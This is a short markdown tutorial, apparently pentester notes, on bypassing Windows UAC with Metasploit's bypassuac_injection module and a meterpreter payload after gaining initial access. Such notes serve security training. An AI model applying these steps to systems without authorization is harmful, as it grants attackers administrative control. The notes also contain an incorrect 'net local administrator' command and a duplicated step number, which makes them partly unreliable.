### How to perform UAC Bypass with `MSF` ?

1. Gain initial access to the target.

2. Check whether if we have a x64 bit session.

3. We can use `getsystem` command to check whether we can elevate our privileges using impersonation attacks.

4. We can go to `shell` and check which users are in the administrator group. 
```
net local administrator
```

4. Bypassing UAC by executing payload in memory
```
use exploit/windows/local/bypassuac_injection
```
- Change the payload to a x64 `meterpreter` payload.
- Set TARGET to `Windows\ x64`
- Change the `LPORT`, it'll be set to default port 4444. Our initial session will also be using the same port.

5. We can now use the `getsystem` command as UAC has been disabled.
